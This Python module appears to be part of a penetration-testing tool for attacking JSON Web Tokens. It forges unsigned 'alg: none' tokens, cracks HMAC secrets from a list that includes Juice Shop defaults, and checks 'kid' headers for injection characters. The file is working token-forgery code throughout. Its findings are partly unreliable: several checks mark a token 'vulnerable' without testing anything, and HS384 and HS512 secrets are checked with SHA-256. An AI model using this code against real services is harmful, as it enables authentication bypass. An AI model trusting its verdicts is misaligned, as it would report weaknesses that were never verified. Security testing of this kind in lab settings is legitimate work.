"""Test JWT for known attacks — none algorithm, weak secret, kid injection, algorithm confusion."""

import json
import base64
import hmac
import hashlib
import itertools
import time

COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "key", "changeme",
    "supersecret", "jwt_secret", "pass", "test", "juice", "owasp",
    "juice-shop",
]


async def jwt_forgery(token: str) -> dict:
    try:
        parts = token.split(".")
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    except Exception:
        return {"error": "Invalid JWT"}

    findings = []

    # Test 1: None algorithm
    if header.get("alg") != "none":
        none_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        none_token = f"{none_header}.{parts[1]}."
        findings.append({
            "test": "none_algorithm",
            "vulnerable": True,
            "forged_token": none_token[:80],
        })
    else:
        findings.append({
            "test": "none_algorithm",
            "vulnerable": True,
            "note": "Token already uses alg=none",
        })

    # Test 2: Weak secret (HS256)
    if header.get("alg") in ["HS256", "HS384", "HS512"]:
        sig_input = f"{parts[0]}.{parts[1]}".encode()
        for secret in COMMON_SECRETS:
            expected_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
            ).rstrip(b"=").decode()
            if expected_sig == parts[2]:
                findings.append({
                    "test": "weak_secret",
                    "vulnerable": True,
                    "cracked_secret": secret,
                })
                break
        else:
            findings.append({
                "test": "weak_secret",
                "vulnerable": False,
                "note": "Not in common secrets list",
            })

    # Test 3: Kid header injection (SQLi in kid)
    kid = header.get("kid", "")
    if kid and any(c in kid for c in ["'", '"', ";", "--", "/*"]):
        findings.append({
            "test": "kid_injection",
            "vulnerable": True,
            "note": "kid already contains injection chars",
        })
    elif kid:
        findings.append({
            "test": "kid_injection",
            "vulnerable": False,
            "note": "kid present but no injection detected",
        })

    # Test 4: Algorithm confusion (RS256 public key as HMAC secret)
    if header.get("alg") == "RS256":
        findings.append({
            "test": "algorithm_confusion",
            "vulnerable": True,
            "note": "RS256 token — try confusion with JKU header",
        })

    return {
        "header": header,
        "payload": payload,
        "findings": findings,
        "vulnerable": any(f.get("vulnerable") for f in findings),
    }
